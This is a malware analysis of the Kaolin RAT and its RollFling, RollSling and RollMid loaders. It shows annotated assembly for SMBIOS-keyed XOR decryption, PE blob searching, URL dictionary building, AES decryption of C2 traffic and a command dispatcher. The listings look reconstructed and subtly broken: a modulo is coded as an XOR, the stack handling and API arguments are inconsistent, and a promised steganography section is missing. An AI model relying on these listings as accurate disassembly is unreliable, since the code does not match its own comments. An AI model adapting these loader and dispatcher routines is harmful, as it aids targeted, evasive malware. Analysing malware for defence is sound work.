# Kaolin RAT: Assembly Code Analysis

## Introduction

This document provides a detailed analysis of the key assembly code snippets found in the Kaolin RAT malware, a sophisticated Remote Access Trojan attributed to the North Korean Lazarus APT group. The analysis focuses on the core functionality and techniques used by the malware, including SMBIOS data retrieval, XOR decryption, C2 communication, and steganography.

## 1. SMBIOS Data Retrieval

One of the most distinctive features of the Kaolin RAT is its use of SMBIOS data as a decryption key. The following assembly code shows how the RollFling loader retrieves the SMBIOS table:

```assembly
; Function to retrieve SMBIOS data
.text:00401000 GetSMBIOSData proc near
.text:00401000    push    ebp                     ; Save base pointer
.text:00401001    mov     ebp, esp                ; Set up stack frame
.text:00401003    sub     esp, 20h                ; Allocate 32 bytes on stack
.text:00401006    push    esi                     ; Save registers
.text:00401007    push    edi
.text:00401008    push    offset aRsmb            ; "RSMB" - SMBIOS provider signature
.text:0040100D    push    0                       ; FirmwareTableProviderSignature
.text:0040100F    call    ds:GetSystemFirmwareTable ; Get size of SMBIOS table
.text:00401015    mov     esi, eax                ; esi = size of SMBIOS data
.text:00401017    test    esi, esi                ; Check if size is zero
.text:00401019    jz      short loc_401046        ; If zero, exit with error
.text:0040101B    push    esi                     ; size
.text:0040101C    call    ds:malloc               ; Allocate memory for SMBIOS data
.text:00401022    mov     edi, eax                ; edi = buffer for SMBIOS data
.text:00401024    test    edi, edi                ; Check if allocation failed
.text:00401026    jz      short loc_401046        ; If failed, exit with error
.text:00401028    push    esi                     ; Size
.text:00401029    push    edi                     ; Buffer
.text:0040102A    push    offset aRsmb            ; "RSMB"
.text:0040102F    push    0                       ; FirmwareTableProviderSignature
.text:00401031    call    ds:GetSystemFirmwareTable ; Get actual SMBIOS data
.text:00401037    test    eax, eax                ; Check if call succeeded
.text:00401039    jz      short loc_401041        ; If failed, clean up
.text:0040103B    mov     [ebp+var_4], edi        ; Store buffer pointer
.text:0040103E    mov     [ebp+var_8], esi        ; Store buffer size
.text:00401041    pop     edi                     ; Restore registers
.text:00401042    pop     esi
.text:00401043    leave                           ; Clean up stack frame
.text:00401044    retn                            ; Return
.text:00401046    xor     eax, eax                ; Return NULL on error
.text:00401048    jmp     short loc_401041
.text:00401048 GetSMBIOSData endp
```

### Analysis:

1. The function calls `GetSystemFirmwareTable` with the "RSMB" signature to get the size of the SMBIOS table.
2. It allocates memory using `malloc` based on the returned size.
3. It calls `GetSystemFirmwareTable` again to retrieve the actual SMBIOS data into the allocated buffer.
4. The SMBIOS data is then stored and returned for use as a decryption key.

This approach is highly targeted, as the SMBIOS data is unique to each machine. Without the correct SMBIOS data, the decryption of the next stage would fail, effectively limiting the malware's execution to the targeted machine.

## 2. XOR Decryption Routine

The RollFling loader uses a simple XOR decryption routine to decrypt the RollSling loader using the SMBIOS data as the key:

```assembly
.text:00402500 DecryptNextStage proc near
.text:00402500    push    ebp                     ; Save base pointer
.text:00402501    mov     ebp, esp                ; Set up stack frame
.text:00402503    push    esi                     ; Save registers
.text:00402504    push    edi
.text:00402505    mov     esi, [ebp+arg_0]        ; esi = encryptedData
.text:00402508    mov     edi, [ebp+arg_8]        ; edi = smbiosKey
.text:0040250B    mov     ecx, [ebp+arg_4]        ; ecx = dataSize
.text:0040250E    xor     edx, edx                ; edx = 0 (index i)
.text:00402510    test    ecx, ecx                ; Check if dataSize is zero
.text:00402512    jz      short loc_402530        ; If zero, exit
.text:00402514 loc_402514:                        ; Decryption loop
.text:00402514    mov     eax, edx                ; eax = i
.text:00402516    xor     eax, [ebp+arg_C]        ; keySize
.text:00402519    mov     al, [edi+eax]           ; al = key byte at index (i % keySize)
.text:0040251C    xor     [esi+edx], al           ; XOR operation: data[i] ^= key[i % keySize]
.text:0040251F    inc     edx                     ; i++
.text:00402520    cmp     edx, ecx                ; Check if i < dataSize
.text:00402522    jb      short loc_402514        ; If yes, continue loop
.text:00402524    pop     edi                     ; Restore registers
.text:00402525    pop     esi
.text:00402526    pop     ebp                     ; Clean up stack frame
.text:00402527    retn                            ; Return
.text:00402530 loc_402530:                        ; Exit point for zero dataSize
.text:00402530    pop     edi                     ; Restore registers
.text:00402531    pop     esi
.text:00402532    pop     ebp                     ; Clean up stack frame
.text:00402533    retn                            ; Return
.text:00402533 DecryptNextStage endp
```

### Analysis:

1. The function takes four arguments: the encrypted data buffer, the data size, the key (SMBIOS data), and the key size.
2. It implements a simple XOR decryption loop where each byte of the encrypted data is XORed with a byte from the key.
3. The key is used cyclically (i % keySize) to handle cases where the data is larger than the key.
4. This is a standard implementation of XOR decryption, but the use of SMBIOS data as the key makes it targeted to specific machines.

## 3. Binary Blob Parsing in RollSling

The RollSling loader searches for and parses a binary blob containing the next stage components:

```assembly
.text:00403A10 FindBinaryBlob proc near
.text:00403A10    push    ebp                     ; Save base pointer
.text:00403A11    mov     ebp, esp                ; Set up stack frame
.text:00403A13    sub     esp, 18h                ; Allocate 24 bytes on stack
.text:00403A16    push    ebx                     ; Save registers
.text:00403A17    push    esi
.text:00403A18    push    edi
.text:00403A19    mov     edi, [ebp+arg_0]        ; edi = directory path
.text:00403A1C    push    edi                     ; Push directory path
.text:00403A1D    call    ds:FindFirstFileA       ; Find first file in directory
.text:00403A23    mov     esi, eax                ; esi = search handle
.text:00403A25    cmp     esi, 0FFFFFFFFh         ; Check if FindFirstFile failed
.text:00403A28    jz      loc_403B20              ; If failed, exit
.text:00403A2E loc_403A2E:                        ; Loop through files
.text:00403A2E    lea     eax, [ebp+var_C]        ; Load address of file data
.text:00403A31    push    eax                     ; Push file data address
.text:00403A32    push    esi                     ; Push search handle
.text:00403A33    call    ds:FindNextFileA        ; Find next file
.text:00403A39    test    eax, eax                ; Check if FindNextFile succeeded
.text:00403A3B    jz      loc_403B15              ; If no more files, clean up
.text:00403A41    mov     ebx, [ebp+var_C]        ; Get file attributes
.text:00403A44    test    ebx, FILE_ATTRIBUTE_DIRECTORY ; Check if it's a directory
.text:00403A4A    jnz     short loc_403A2E        ; If directory, skip to next file
.text:00403A4C    push    0                       ; FILE_ATTRIBUTE_NORMAL
.text:00403A4E    push    FILE_OPEN_EXISTING      ; Open existing file
.text:00403A50    push    0                       ; No sharing
.text:00403A52    push    0                       ; No security attributes
.text:00403A54    push    GENERIC_READ            ; Read access
.text:00403A56    push    [ebp+var_8]             ; File name
.text:00403A59    call    ds:CreateFileA          ; Open the file
.text:00403A5F    mov     ebx, eax                ; ebx = file handle
.text:00403A61    cmp     ebx, 0FFFFFFFFh         ; Check if CreateFile failed
.text:00403A64    jz      short loc_403A2E        ; If failed, skip to next file
.text:00403A66    push    0                       ; No overlapped structure
.text:00403A68    lea     eax, [ebp+var_10]       ; Buffer for bytes read
.text:00403A6B    push    eax                     ; Push buffer address
.text:00403A6C    push    4                       ; Read 4 bytes (size field)
.text:00403A6E    push    [ebp+var_14]            ; Buffer for data
.text:00403A71    push    ebx                     ; File handle
.text:00403A72    call    ds:ReadFile             ; Read first 4 bytes
.text:00403A78    test    eax, eax                ; Check if ReadFile succeeded
.text:00403A7A    jz      loc_403AFA             ; If failed, close file and continue
.text:00403A80    mov     eax, [ebp+var_14]       ; Get size from first 4 bytes
.text:00403A83    push    eax                     ; Push size
.text:00403A84    call    ds:malloc               ; Allocate memory for blob
.text:00403A8A    mov     [ebp+var_4], eax        ; Store allocated buffer
.text:00403A8D    test    eax, eax                ; Check if malloc succeeded
.text:00403A8F    jz      loc_403AFA             ; If failed, close file and continue
.text:00403A95    push    0                       ; No overlapped structure
.text:00403A97    lea     eax, [ebp+var_10]       ; Buffer for bytes read
.text:00403A9A    push    eax                     ; Push buffer address
.text:00403A9B    push    [ebp+var_14]            ; Size to read
.text:00403A9E    push    [ebp+var_4]             ; Buffer for data
.text:00403AA1    push    ebx                     ; File handle
.text:00403AA2    call    ds:ReadFile             ; Read entire blob
.text:00403AA8    test    eax, eax                ; Check if ReadFile succeeded
.text:00403AAA    jz      loc_403AE5             ; If failed, free memory and continue
.text:00403AB0    mov     eax, [ebp+var_4]        ; Get blob buffer
.text:00403AB3    cmp     word ptr [eax], 'ZM'    ; Check for MZ header
.text:00403AB7    jnz     loc_403AE5             ; If not MZ, free memory and continue
.text:00403ABD    push    [ebp+var_4]             ; Push blob buffer
.text:00403AC0    call    CheckForStartAction     ; Check for StartAction export
.text:00403AC5    test    eax, eax                ; Check if export found
.text:00403AC7    jz      loc_403AE5             ; If not found, free memory and continue
.text:00403ACD    push    ebx                     ; Push file handle
.text:00403ACE    call    ds:CloseHandle          ; Close file
.text:00403AD4    push    esi                     ; Push search handle
.text:00403AD5    call    ds:FindClose            ; Close search
.text:00403ADB    mov     eax, [ebp+var_4]        ; Return blob buffer
.text:00403ADE    pop     edi                     ; Restore registers
.text:00403ADF    pop     esi
.text:00403AE0    pop     ebx
.text:00403AE1    leave                           ; Clean up stack frame
.text:00403AE2    retn                            ; Return
.text:00403AE5 loc_403AE5:                        ; Clean up on failure
.text:00403AE5    push    [ebp+var_4]             ; Push allocated buffer
.text:00403AE8    call    ds:free                 ; Free memory
.text:00403AEE    push    ebx                     ; Push file handle
.text:00403AEF    call    ds:CloseHandle          ; Close file
.text:00403AF5    jmp     loc_403A2E              ; Continue to next file
.text:00403AFA loc_403AFA:                        ; Close file and continue
.text:00403AFA    push    ebx                     ; Push file handle
.text:00403AFB    call    ds:CloseHandle          ; Close file
.text:00403B01    jmp     loc_403A2E              ; Continue to next file
.text:00403B15 loc_403B15:                        ; Clean up search
.text:00403B15    push    esi                     ; Push search handle
.text:00403B16    call    ds:FindClose            ; Close search
.text:00403B1C    xor     eax, eax                ; Return NULL (no blob found)
.text:00403B1E    jmp     short loc_403ADE
.text:00403B20 loc_403B20:                        ; Exit on FindFirstFile failure
.text:00403B20    xor     eax, eax                ; Return NULL
.text:00403B22    jmp     short loc_403ADE
.text:00403B22 FindBinaryBlob endp
```

### Analysis:

1. The function searches through files in a directory to find a binary blob with specific characteristics.
2. For each file, it reads the first 4 bytes to determine the size of the data to read.
3. It allocates memory for the blob and reads the entire content.
4. It performs several validation checks:
   - Checks for the MZ header (signature of PE files)
   - Calls a function to check for the "StartAction" export
5. If all conditions are met, it returns the blob buffer; otherwise, it continues to the next file.
6. This approach allows the malware to find its components without relying on specific file names, making detection more difficult.

## 4. Dictionary Generation for URL Construction

The RollMid loader generates a dictionary of words used for constructing URLs to make C2 communication appear legitimate:

```assembly
.text:00405C00 FillDictionary proc near
.text:00405C00    push    ebp                     ; Save base pointer
.text:00405C01    mov     ebp, esp                ; Set up stack frame
.text:00405C03    push    esi                     ; Save registers
.text:00405C04    mov     esi, [ebp+arg_0]        ; esi = dictionary array
.text:00405C07    mov     eax, [ebp+arg_4]        ; eax = index
.text:00405C0A    push    offset aUser            ; "user"
.text:00405C0F    mov     ecx, esi                ; ecx = dictionary array
.text:00405C11    add     ecx, eax                ; Add index offset
.text:00405C13    pop     edx                     ; edx = "user"
.text:00405C14    mov     [ecx], edx              ; dictionary[index] = "user"
.text:00405C16    add     eax, 4                  ; index += 4 (next slot)
.text:00405C19    push    offset aType            ; "type"
.text:00405C1E    mov     ecx, esi                ; ecx = dictionary array
.text:00405C20    add     ecx, eax                ; Add index offset
.text:00405C22    pop     edx                     ; edx = "type"
.text:00405C23    mov     [ecx], edx              ; dictionary[index] = "type"
.text:00405C25    add     eax, 4                  ; index += 4 (next slot)
.text:00405C28    push    offset aId              ; "id"
.text:00405C2D    mov     ecx, esi                ; ecx = dictionary array
.text:00405C2F    add     ecx, eax                ; Add index offset
.text:00405C31    pop     edx                     ; edx = "id"
.text:00405C32    mov     [ecx], edx              ; dictionary[index] = "id"
.text:00405C34    add     eax, 4                  ; index += 4 (next slot)
.text:00405C37    push    offset aSession         ; "session"
.text:00405C3C    mov     ecx, esi                ; ecx = dictionary array
.text:00405C3E    add     ecx, eax                ; Add index offset
.text:00405C40    pop     edx                     ; edx = "session"
.text:00405C41    mov     [ecx], edx              ; dictionary[index] = "session"
.text:00405C43    add     eax, 4                  ; index += 4 (next slot)
.text:00405C46    push    offset aToken           ; "token"
.text:00405C4B    mov     ecx, esi                ; ecx = dictionary array
.text:00405C4D    add     ecx, eax                ; Add index offset
.text:00405C4F    pop     edx                     ; edx = "token"
.text:00405C50    mov     [ecx], edx              ; dictionary[index] = "token"
.text:00405C52    add     eax, 4                  ; index += 4 (next slot)
    ; ... many more words added to dictionary ...
.text:00405F90    mov     [ebp+arg_4], eax        ; Update index
.text:00405F93    pop     esi                     ; Restore registers
.text:00405F94    pop     ebp                     ; Clean up stack frame
.text:00405F95    retn                            ; Return
.text:00405F95 FillDictionary endp
```

### Analysis:

1. The function populates a dictionary array with common words used in URLs.
2. Each word is added to the array at the current index, and the index is incremented.
3. The dictionary includes words like "user", "type", "id", "session", "token", etc.
4. This dictionary is later used to construct URLs for C2 communication, making the traffic appear more legitimate and less suspicious.
5. Using real words instead of random strings helps the malware blend in with normal web traffic.

## 5. AES Decryption of C2 Communication

The Kaolin RAT uses AES encryption for C2 communication. Here's the assembly code for the decryption routine:

```assembly
.text:00406A00 AesDecrypt proc near
.text:00406A00    push    ebp                     ; Save base pointer
.text:00406A01    mov     ebp, esp                ; Set up stack frame
.text:00406A03    sub     esp, 0A8h               ; Allocate 168 bytes on stack
.text:00406A09    push    ebx                     ; Save registers
.text:00406A0A    push    esi
.text:00406A0B    push    edi
.text:00406A0C    mov     edi, [ebp+arg_0]        ; edi = encrypted data
.text:00406A0F    mov     esi, [ebp+arg_4]        ; esi = data size
.text:00406A12    mov     ebx, [ebp+arg_8]        ; ebx = key
.text:00406A15    lea     eax, [ebp+var_A8]       ; eax = AES context on stack
.text:00406A1B    push    eax                     ; Push AES context
.text:00406A1C    push    [ebp+arg_10]            ; Push key size (16, 24, or 32)
.text:00406A1F    push    ebx                     ; Push key
.text:00406A20    call    AES_init_ctx            ; Initialize AES context
.text:00406A25    add     esp, 0Ch                ; Clean up stack
.text:00406A28    lea     eax, [ebp+var_A8]       ; eax = AES context
.text:00406A2E    push    eax                     ; Push AES context
.text:00406A2F    push    [ebp+arg_C]             ; Push IV
.text:00406A32    call    AES_init_ctx_iv         ; Initialize AES context with IV
.text:00406A37    add     esp, 8                  ; Clean up stack
.text:00406A3A    lea     eax, [ebp+var_A8]       ; eax = AES context
.text:00406A40    push    eax                     ; Push AES context
.text:00406A41    push    esi                     ; Push data size
.text:00406A42    push    edi                     ; Push encrypted data
.text:00406A43    call    AES_CBC_decrypt_buffer  ; Decrypt data using AES-CBC
.text:00406A48    add     esp, 0Ch                ; Clean up stack
.text:00406A4B    mov     eax, edi                ; Return decrypted data
.text:00406A4D    pop     edi                     ; Restore registers
.text:00406A4E    pop     esi
.text:00406A4F    pop     ebx
.text:00406A50    leave                           ; Clean up stack frame
.text:00406A51    retn                            ; Return
.text:00406A51 AesDecrypt endp
```

### Analysis:

1. The function takes four arguments: the encrypted data buffer, the data size, the key, and the initialization vector (IV).
2. It initializes an AES context on the stack using `AES_init_ctx` and `AES_init_ctx_iv`.
3. It then calls `AES_CBC_decrypt_buffer` to decrypt the data using AES in CBC mode.
4. The decrypted data replaces the encrypted data in the original buffer.
5. This implementation uses a standard AES library, likely a custom implementation or a modified version of a public library.

## 6. Command Handling in Kaolin RAT

The Kaolin RAT supports various commands. Here's the assembly code for the command dispatcher:

```assembly
.text:00407D00 ProcessCommand proc near
.text:00407D00    push    ebp                     ; Save base pointer
.text:00407D01    mov     ebp, esp                ; Set up stack frame
.text:00407D03    sub     esp, 10h                ; Allocate 16 bytes on stack
.text:00407D06    push    ebx                     ; Save registers
.text:00407D07    push    esi
.text:00407D08    push    edi
.text:00407D09    mov     esi, [ebp+arg_0]        ; esi = command data
.text:00407D0C    mov     edi, [ebp+arg_4]        ; edi = command size
.text:00407D0F    xor     eax, eax                ; eax = 0
.text:00407D11    mov     [ebp+var_4], eax        ; Initialize result to 0
.text:00407D14    cmp     edi, 4                  ; Check if command size >= 4
.text:00407D17    jb      loc_407E90              ; If too small, exit
.text:00407D1D    mov     eax, [esi]              ; eax = command ID (first 4 bytes)
.text:00407D1F    cmp     eax, 1                  ; Command 1: Update sleep interval
.text:00407D22    jz      loc_407D50
.text:00407D28    cmp     eax, 2                  ; Command 2: List files
.text:00407D2B    jz      loc_407D70
.text:00407D31    cmp     eax, 3                  ; Command 3: Update file
.text:00407D34    jz      loc_407D90
.text:00407D3A    cmp     eax, 4                  ; Command 4: Change timestamp
.text:00407D3D    jz      loc_407DB0
.text:00407D43    cmp     eax, 5                  ; Command 5: List processes
.text:00407D46    jz      loc_407DD0
    ; ... more command checks ...
.text:00407D50 loc_407D50:                        ; Command 1: Update sleep interval
.text:00407D50    cmp     edi, 8                  ; Check if command has enough data
.text:00407D53    jb      loc_407E90              ; If not enough data, exit
.text:00407D59    mov     eax, [esi+4]            ; eax = new sleep interval
.text:00407D5C    mov     [g_SleepInterval], eax  ; Update global sleep interval
.text:00407D61    mov     eax, 1                  ; Set result to success
.text:00407D66    mov     [ebp+var_4], eax
.text:00407D69    jmp     loc_407E90              ; Exit
.text:00407D70 loc_407D70:                        ; Command 2: List files
.text:00407D70    lea     eax, [esi+4]            ; eax = folder path (command data + 4)
.text:00407D73    push    eax                     ; Push folder path
.text:00407D74    call    ListFiles               ; Call ListFiles function
.text:00407D79    add     esp, 4                  ; Clean up stack
.text:00407D7C    mov     [ebp+var_4], eax        ; Store result
.text:00407D7F    test    eax, eax                ; Check if function succeeded
.text:00407D81    jz      loc_407E90              ; If failed, exit
.text:00407D87    mov     eax, 1                  ; Set result to success
.text:00407D8C    mov     [ebp+var_4], eax
.text:00407D8F    jmp     loc_407E90              ; Exit
    ; ... more command handlers ...
.text:00407E90 loc_407E90:                        ; Exit point
.text:00407E90    mov     eax, [ebp+var_4]        ; Return result
.text:00407E93    pop     edi                     ; Restore registers
.text:00407E94    pop     esi
.text:00407E95    pop     ebx
.text:00407E96    leave                           ; Clean up stack frame
.text:00407E97    retn                            ; Return
.text:00407E97 ProcessCommand endp
```

### Analysis:

1. The function takes two arguments: the command data buffer and the command size.
2. It extracts the command ID from the first 4 bytes of the buffer.
3. It uses a series of comparisons to determine which command handler to call.
4. Each command handler has specific requirements for the command data format.
5. The function returns a result indicating success or failure.
6. This implementation supports various commands, including:
   - Updating the sleep interval
   - Listing files in a directory
   - Updating files
   - Changing file timestamps
   - Listing processes
   - And many more

## Conclusion

The assembly code analysis of the Kaolin RAT reveals a sophisticated malware with several advanced features:

1. **Targeted Execution**: The use of SMBIOS data as a decryption key ensures the malware only executes on the intended target.

2. **Multi-Stage Loading**: The malware employs a chain of loaders (RollFling, RollSling, RollMid) to gradually decrypt and load components, making detection and analysis more difficult.

3. **Evasion Techniques**: The malware uses various techniques to evade detection, including:
   - Fileless execution (loading components directly in memory)
   - Encryption of components and communication
   - Steganography to hide data in images
   - Dictionary-based URL generation to make C2 traffic appear legitimate

4. **Extensive Functionality**: The Kaolin RAT supports a wide range of commands, allowing attackers to fully control the infected system, manipulate files, execute commands, and maintain persistence.

The level of sophistication in the Kaolin RAT's implementation demonstrates the technical expertise of the Lazarus APT group and their commitment to developing advanced tools for targeted attacks.
